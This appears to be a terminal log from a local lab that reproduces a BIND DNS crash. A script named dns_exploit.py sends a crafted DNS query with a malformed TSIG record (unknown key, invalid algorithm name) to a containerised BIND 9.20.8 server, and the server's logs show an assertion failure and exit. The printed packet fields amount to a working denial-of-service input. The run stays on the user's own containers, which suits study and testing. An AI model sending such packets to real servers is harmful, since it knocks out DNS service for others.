@@ -1,0 +1,912 @@
+PS C:\Users\alexs\nhi-zero-trust-bypass> docker ps -a
+CONTAINER ID   IMAGE                                   COMMAND                  CREATED             STATUS          PORTS                                                   NAMES
+1740bffd0755   nhi-zero-trust-bypass-api-service       "python app.py"          About an hour ago   Up 16 seconds   0.0.0.0:5000->5000/tcp                                  mock_api_service
+523efcfa2839   nhi-zero-trust-bypass-secrets-manager   "python app.py"          About an hour ago   Up 17 seconds   0.0.0.0:8200->8200/tcp                                  mock_secrets_manager
+14ee9d4fd8ce   nhi-zero-trust-bypass-bind-dns          "/usr/sbin/named -u …"   About an hour ago   Up 17 seconds   953/tcp, 0.0.0.0:53530->53/tcp, 0.0.0.0:53530->53/udp   vulnerable_bind
+PS C:\Users\alexs\nhi-zero-trust-bypass> python .\dns_exploit.py
+Crafted packet summary:
+###[ IP ]###
+  version   = 4
+  ihl       = None
+  tos       = 0x0
+  len       = None
+  id        = 1
+  flags     =
+  frag      = 0
+  ttl       = 64
+  proto     = udp
+  chksum    = None
+  src       = 127.0.0.1
+  dst       = 127.0.0.1
+  \options   \
+###[ UDP ]###
+     sport     = 54321
+     dport     = 53530
+     len       = None
+     chksum    = None
+###[ DNS ]###
+        id        = 12345
+        qr        = 0
+        opcode    = QUERY
+        aa        = 0
+        tc        = 0
+        rd        = 1
+        ra        = 0
+        z         = 0
+        ad        = 0
+        cd        = 0
+        rcode     = ok
+        qdcount   = 1
+        ancount   = 0
+        nscount   = 0
+        arcount   = 1
+        \qd        \
+         |###[ DNS Question Record ]###
+         |  qname     = b'example.com.'
+         |  qtype     = A
+         |  unicastresponse= 0
+         |  qclass    = IN
+        \an        \
+        \ns        \
+        \ar        \
+         |###[ DNS TSIG Resource Record ]###
+         |  rrname    = b'exploit.key.name.'
+         |  type      = TSIG
+         |  rclass    = ANY
+         |  ttl       = 0
+         |  rdlen     = None
+         |  algo_name = b'invalid-algo-id-255.example.com.'
+         |  time_signed= Fri May 23 01:05:25 2025
+         |  fudge     = 300
+         |  mac_len   = 0
+         |  mac_data  = b''
+         |  original_id= 12345
+         |  error     = 0
+         |  other_len = 0
+         |  other_data= b''
+
+
+Sending packet to 127.0.0.1:53530...
+.
+Sent 1 packets.
+Packet sent.
+
+---
+To run this script, you might need to use 'sudo python dns_exploit.py' (on Linux/macOS)
+or run your terminal/IDE as Administrator (on Windows).
+Ensure the target BIND server is running (Docker port 53530 mapped to container 53) and is vulnerable.
+The effectiveness depends on the specific BIND vulnerability (e.g., placeholder CVE-2025-40775).
+PS C:\Users\alexs\nhi-zero-trust-bypass> docker ps -a
+CONTAINER ID   IMAGE                                   COMMAND                  CREATED             STATUS                       PORTS                    NAMES
+1740bffd0755   nhi-zero-trust-bypass-api-service       "python app.py"          About an hour ago   Up 37 seconds                0.0.0.0:5000->5000/tcp   mock_api_service
+523efcfa2839   nhi-zero-trust-bypass-secrets-manager   "python app.py"          About an hour ago   Up 37 seconds                0.0.0.0:8200->8200/tcp   mock_secrets_manager
+14ee9d4fd8ce   nhi-zero-trust-bypass-bind-dns          "/usr/sbin/named -u …"   About an hour ago   Exited (139) 4 seconds ago                            vulnerable_bind
+PS C:\Users\alexs\nhi-zero-trust-bypass> docker logs vulnerable_bind
+22-May-2025 19:40:59.750 general: debug 1: now using logging configuration from config file
+22-May-2025 19:40:59.750 general: debug 1: loop exclusive mode: ending
+22-May-2025 19:40:59.750 general: debug 1: loop exclusive mode: ended
+22-May-2025 19:40:59.760 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 19:40:59.760 general: notice: command channel listening on 127.0.0.1#953
+22-May-2025 19:40:59.760 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 19:40:59.830 general: notice: command channel listening on ::1#953
+22-May-2025 19:40:59.830 general: debug 1: load_configuration: success
+22-May-2025 19:40:59.830 general: debug 1: loop exclusive mode: starting
+22-May-2025 19:40:59.830 general: debug 1: loop exclusive mode: started
+22-May-2025 19:40:59.830 zoneload: debug 1: managed-keys-zone: starting load
+22-May-2025 19:40:59.830 general: debug 1: zone_startload: managed-keys-zone: enter
+22-May-2025 19:40:59.830 zoneload: debug 1: managed-keys-zone: loading from master file managed-keys.bind failed: file not found
+22-May-2025 19:40:59.830 zoneload: debug 2: managed-keys-zone: number of nodes in database: 1
+22-May-2025 19:40:59.830 general: debug 1: managed-keys-zone: creating SOA
+22-May-2025 19:40:59.830 zoneload: debug 3: managed-keys-zone: no journal file, but that's OK
+22-May-2025 19:40:59.830 zoneload: debug 1: managed-keys-zone: loaded; checking validity
+22-May-2025 19:40:59.830 zoneload: info: managed-keys-zone: loaded serial 0
+22-May-2025 19:40:59.830 general: debug 1: loop exclusive mode: ending
+22-May-2025 19:40:59.830 general: debug 1: loop exclusive mode: ended
+22-May-2025 19:40:59.830 zoneload: debug 1: zone authors.bind/CH: starting load
+22-May-2025 19:40:59.830 zoneload: debug 1: zone id.server/CH: starting load
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.830 zoneload: debug 2: zone authors.bind/CH: number of nodes in database: 0
+22-May-2025 19:40:59.830 zoneload: debug 2: zone id.server/CH: number of nodes in database: 0
+22-May-2025 19:40:59.830 zoneload: debug 1: zone version.bind/CH: starting load
+22-May-2025 19:40:59.830 zoneload: debug 2: zone version.bind/CH: number of nodes in database: 0
+22-May-2025 19:40:59.830 zoneload: debug 1: zone version.bind/CH: loaded; checking validity
+22-May-2025 19:40:59.830 zoneload: debug 1: zone id.server/CH: loaded; checking validity
+22-May-2025 19:40:59.830 zoneload: debug 1: zone authors.bind/CH: loaded; checking validity
+22-May-2025 19:40:59.830 general: debug 1: dns_zone_verifydb: zone version.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: dns_zone_verifydb: zone authors.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: dns_zone_verifydb: zone id.server/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:40:59.830 zoneload: debug 1: zone hostname.bind/CH: starting load
+22-May-2025 19:40:59.830 zoneload: debug 2: zone hostname.bind/CH: number of nodes in database: 0
+22-May-2025 19:40:59.830 zoneload: debug 1: zone hostname.bind/CH: loaded; checking validity
+22-May-2025 19:40:59.830 general: debug 1: zone_maintenance: zone version.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: dns_zone_verifydb: zone hostname.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: zone_maintenance: zone id.server/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:40:59.830 general: notice: all zones loaded
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:40:59.830 general: debug 1: managed-keys-zone: synchronizing trusted keys
+22-May-2025 19:40:59.830 general: debug 1: create_keydata: managed-keys-zone: enter
+22-May-2025 19:40:59.830 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:40:59.830 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:40:59.830
+22-May-2025 19:40:59.830 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.830 general: debug 1: zone_journal: managed-keys-zone: enter
+22-May-2025 19:40:59.830 general: debug 1: journal file managed-keys.bind.jnl does not exist, creating it
+22-May-2025 19:40:59.830 general: debug 3: writing to journal
+22-May-2025 19:40:59.840 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: notice: FIPS mode is disabled
+22-May-2025 19:40:59.840 general: notice: running
+22-May-2025 19:40:59.840 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: debug 1: zone_refreshkeys: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:40:59.840
+22-May-2025 19:40:59.840 general: debug 1: zone_maintenance: zone hostname.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone_maintenance: zone authors.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:40:59.840 dnssec: debug 3: managed-keys-zone: Creating key fetch in zone_refreshkeys() for '.'
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.840 resolver: debug 1: fetch: ./DNSKEY
+22-May-2025 19:40:59.840 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.840 resolver: debug 1: fetch: ./NS
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f0778001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fd::1#53
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 resolver: debug 3: fctx 0x7f07780038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2801:1b8:10::b#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2801:1b8:10::b#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:dc3::35#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:dc3::35#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2::c#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2::c#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:ba3e::2:30#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:ba3e::2:30#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:12::d0d#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:12::d0d#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:1::53#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:1::53#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fe::53#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fe::53#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:c27::2:30#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:c27::2:30#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2d::d#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2d::d#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:a8::e#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:a8::e#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2f::f#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2f::f#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:9f::42#53
+22-May-2025 19:40:59.840 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:9f::42#53
+22-May-2025 19:40:59.940 dnssec: debug 3: managed-keys-zone: Returned from key fetch in keyfetch_done() for '.': success
+22-May-2025 19:40:59.940 dnssec: debug 3: managed-keys-zone: Verifying DNSKEY set for zone '.' using DS 20326/8: success
+22-May-2025 19:40:59.940 dnssec: warning: managed-keys-zone: Initializing automatic trust anchor management for zone '.'; DNSKEY ID 20326 is now trusted, waiving the normal 30-day waiting period.
+22-May-2025 19:40:59.940 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:40:59.940 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 19:40:59.940
+22-May-2025 19:40:59.940 dnssec: warning: managed-keys-zone: Initializing automatic trust anchor management for zone '.'; DNSKEY ID 38696 is now trusted, waiving the normal 30-day waiting period.
+22-May-2025 19:40:59.940 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:40:59.940 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 19:40:59.940
+22-May-2025 19:40:59.940 general: debug 1: zone_journal: managed-keys-zone: enter
+22-May-2025 19:40:59.940 general: debug 3: writing to journal
+22-May-2025 19:40:59.950 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 19:40:59.950 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.950 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.950 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: starting
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: attempting positive response validation
+22-May-2025 19:40:59.950 dnssec: debug 3:   validating ./DNSKEY: starting
+22-May-2025 19:40:59.950 dnssec: debug 3:   validating ./DNSKEY: attempting positive response validation
+22-May-2025 19:40:59.950 dnssec: debug 3:   validating ./DNSKEY: verify rdataset (keyid=20326): success
+22-May-2025 19:40:59.950 dnssec: debug 3:   validating ./DNSKEY: marking as secure (DS)
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: in validator_callback_dnskey
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: keyset with trust secure
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: resuming validate
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: verify rdataset (keyid=53148): success
+22-May-2025 19:40:59.950 dnssec: debug 3: validating ./NS: marking as secure, noqname proof not needed
+22-May-2025 19:40:59.950 resolver: debug 1: resolver priming query complete: success
+22-May-2025 19:41:19.469 security: debug 3: client @0x7f07780e8810 (no-peer): allocate new client
+22-May-2025 19:41:19.469 client: debug 3: client @0x7f07780e8810 172.19.0.1#52761: UDP request
+22-May-2025 19:41:19.469 dnssec: debug 3: tsig key 'exploit.key.name': statically configured
+22-May-2025 19:41:19.469 dnssec: debug 2: tsig key 'exploit.key.name': unknown key
+22-May-2025 19:41:19.469 security: error: client @0x7f07780e8810 172.19.0.1#52761: request has invalid signature: TSIG exploit.key.name: tsig verify failure (BADKEY)
+22-May-2025 19:41:19.469 general: critical: ./include/dns/name.h:713: REQUIRE(((name) != ((void *)0) && ((const isc__magic_t *)(name))->magic == ((('D') << 24 | ('N') << 16 | ('S') << 8 | ('n'))))) failed
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(isc_backtrace_log+0x31) [0x7f07a48deee1]
+22-May-2025 19:41:19.479 general: critical: /usr/sbin/named(+0x235a7) [0x5640657975a7]
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(isc_assertion_failed+0xa) [0x7f07a48deaca]
+22-May-2025 19:41:19.479 general: critical: /lib/libdns-9.20.8.so(+0x89c73) [0x7f07a4715c73]
+22-May-2025 19:41:19.479 general: critical: /lib/libdns-9.20.8.so(dns_message_reply+0x198) [0x7f07a471b498]
+22-May-2025 19:41:19.479 general: critical: /lib/libns-9.20.8.so(ns_client_error+0x103) [0x7f07a46511a3]
+22-May-2025 19:41:19.479 general: critical: /lib/libns-9.20.8.so(+0x1122a) [0x7f07a465222a]
+22-May-2025 19:41:19.479 general: critical: /lib/libns-9.20.8.so(ns_client_request+0x6ff) [0x7f07a4652edf]
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(isc__nm_readcb+0xac) [0x7f07a48cba0c]
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(isc__nm_udp_read_cb+0x1c6) [0x7f07a48dd216]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x1dfd5) [0x7f07a4144fd5]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x1f06b) [0x7f07a414606b]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x22e6c) [0x7f07a4149e6c]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(uv_run+0xc4) [0x7f07a41369e4]
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(+0x4519f) [0x7f07a48f119f]
+22-May-2025 19:41:19.479 general: critical: /lib/libisc-9.20.8.so(+0x54d68) [0x7f07a4900d68]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libc.so.6(+0x891f5) [0x7f07a3fcf1f5]
+22-May-2025 19:41:19.479 general: critical: /lib/x86_64-linux-gnu/libc.so.6(+0x10989c) [0x7f07a404f89c]
+22-May-2025 19:41:19.479 general: critical: exiting (due to assertion failure)
+22-May-2025 19:43:58.049 general: debug 1: now using logging configuration from config file
+22-May-2025 19:43:58.049 general: debug 1: loop exclusive mode: ending
+22-May-2025 19:43:58.049 general: debug 1: loop exclusive mode: ended
+22-May-2025 19:43:58.049 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 19:43:58.049 general: notice: command channel listening on 127.0.0.1#953
+22-May-2025 19:43:58.049 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 19:43:58.119 general: notice: command channel listening on ::1#953
+22-May-2025 19:43:58.119 general: debug 1: load_configuration: success
+22-May-2025 19:43:58.119 general: debug 1: loop exclusive mode: starting
+22-May-2025 19:43:58.119 general: debug 1: loop exclusive mode: started
+22-May-2025 19:43:58.119 zoneload: debug 1: managed-keys-zone: starting load
+22-May-2025 19:43:58.119 general: debug 1: zone_startload: managed-keys-zone: enter
+22-May-2025 19:43:58.119 zoneload: debug 1: managed-keys-zone: loading from master file managed-keys.bind failed: file not found
+22-May-2025 19:43:58.119 zoneload: debug 2: managed-keys-zone: number of nodes in database: 1
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: creating SOA
+22-May-2025 19:43:58.119 general: debug 3: managed-keys.bind.jnl: applying final diff to database (2)
+22-May-2025 19:43:58.119 zoneload: debug 1: managed-keys-zone: journal rollforward completed successfully: success
+22-May-2025 19:43:58.119 zoneload: debug 1: managed-keys-zone: loaded; checking validity
+22-May-2025 19:43:58.119 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 19:43:58.119 zoneload: info: managed-keys-zone: loaded serial 2
+22-May-2025 19:43:58.119 general: debug 1: loop exclusive mode: ending
+22-May-2025 19:43:58.119 general: debug 1: loop exclusive mode: ended
+22-May-2025 19:43:58.119 zoneload: debug 1: zone hostname.bind/CH: starting load
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 zoneload: debug 2: zone hostname.bind/CH: number of nodes in database: 0
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 zoneload: debug 1: zone authors.bind/CH: starting load
+22-May-2025 19:43:58.119 zoneload: debug 1: zone hostname.bind/CH: loaded; checking validity
+22-May-2025 19:43:58.119 zoneload: debug 2: zone authors.bind/CH: number of nodes in database: 0
+22-May-2025 19:43:58.119 general: debug 1: dns_zone_verifydb: zone hostname.bind/CH: enter
+22-May-2025 19:43:58.119 zoneload: debug 1: zone version.bind/CH: starting load
+22-May-2025 19:43:58.119 zoneload: debug 2: zone version.bind/CH: number of nodes in database: 0
+22-May-2025 19:43:58.119 zoneload: debug 1: zone version.bind/CH: loaded; checking validity
+22-May-2025 19:43:58.119 general: debug 1: dns_zone_verifydb: zone version.bind/CH: enter
+22-May-2025 19:43:58.119 zoneload: debug 1: zone authors.bind/CH: loaded; checking validity
+22-May-2025 19:43:58.119 zoneload: debug 1: zone id.server/CH: starting load
+22-May-2025 19:43:58.119 zoneload: debug 2: zone id.server/CH: number of nodes in database: 0
+22-May-2025 19:43:58.119 zoneload: debug 1: zone id.server/CH: loaded; checking validity
+22-May-2025 19:43:58.119 general: debug 1: dns_zone_verifydb: zone id.server/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: dns_zone_verifydb: zone authors.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_maintenance: zone hostname.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_maintenance: zone version.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_maintenance: zone id.server/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:43:58.119 general: notice: all zones loaded
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: synchronizing trusted keys
+22-May-2025 19:43:58.119 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:43:58.119
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:43:58.119
+22-May-2025 19:43:58.119 general: notice: FIPS mode is disabled
+22-May-2025 19:43:58.119 general: notice: running
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_maintenance: zone authors.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: zone_refreshkeys: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 19:43:58.119 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:43:58.119
+22-May-2025 19:43:58.119 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 19:43:58.119
+22-May-2025 19:43:58.119 dnssec: debug 3: managed-keys-zone: Creating key fetch in zone_refreshkeys() for '.'
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 resolver: debug 1: fetch: ./DNSKEY
+22-May-2025 19:43:58.119 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.119 resolver: debug 1: fetch: ./NS
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 resolver: debug 3: fctx 0x7efce8001230(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.119 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:ba3e::2:30#53
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
